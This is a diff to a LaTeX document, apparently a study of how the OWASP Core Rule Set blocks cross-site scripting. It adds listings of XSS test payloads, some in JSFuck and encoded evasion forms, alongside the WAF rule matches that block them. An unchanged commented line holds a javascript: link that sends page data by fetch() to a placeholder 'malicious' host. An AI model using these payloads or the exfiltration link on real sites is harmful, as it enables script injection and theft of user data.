@@ -6,7 +6,13 @@
 %
 % <a href="javascript:var secret = document.getElementsByName('name')[0].innerHTML;var data = {body:secret,method:'POST'};fetch('http:\//malicious:3001/api/sendsecret',data)">ClickMeFor$</a>
 % \end{lstlisting}
-
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert('XSS'), label={lst:alertxssblocked}]
+<payload>alert('XSS')</payload>
+<message>"Javascript method detected"</message>
+<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
+<fileDetails>[line "714"] [id "941390"]<fileDetails>
+<MatchedData>"alert("</MatchedData>
+\end{lstlisting}
 
 \begin{lstlisting}[style=ruleStyle, language=XML, caption=unicode tests \$\{`alert`\}, label={lst:jsonunicodetests}]
 <payload>${`alert`}</payload>
@@ -48,11 +54,24 @@
 <MatchedData>"x5cu0024"</MatchedData>
 \end{lstlisting}
 
-
 \begin{lstlisting}[style=basicStyle, caption=url encoded example pass, label={lst:doublepercentencoding}]
 urllib.parse.quote(urllib.parse.quote('alert(`${new Date()}`)'))
 returns
 alert%2528%2560%2524%257Bnew%2520Date%2528%2529%257D%2560%2529
+\end{lstlisting}
+
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert('XSS') in JSFuck blocked, label={lst:alertxssjsfuckblocked}]
+<payload>^(Listing~\ref{lst:alertxssjsfuck})^</payload>
+<message>"JSFuck / Hieroglyphy obfuscation detected"</message>
+<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
+<fileDetails>[line "654"] [id "941360"]<fileDetails>
+<MatchedData>
+"Suspicious payload found within ARGS_NAMES:[][(![] [])[ []] (![] [])[! [] ! []] (![] [])[ ! []] (!![] [])[ []]][([][(![] [])[ []] (![] [])[! [] ! []] (![] [])[ ! []] (!![] [])[ []]] [])[ (11337 characters omitted)"
+</MatchedData>
+<message>"Javascript method detected"</message>
+<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
+<fileDetails>[line "714"] [id "941390"]<fileDetails>
+<MatchedData>"alert("</MatchedData>
 \end{lstlisting}
 
 \begin{lstlisting}[style=basicStyle, caption=alert('XSS') in JSFuck, label={lst:alertxssjsfuck}]
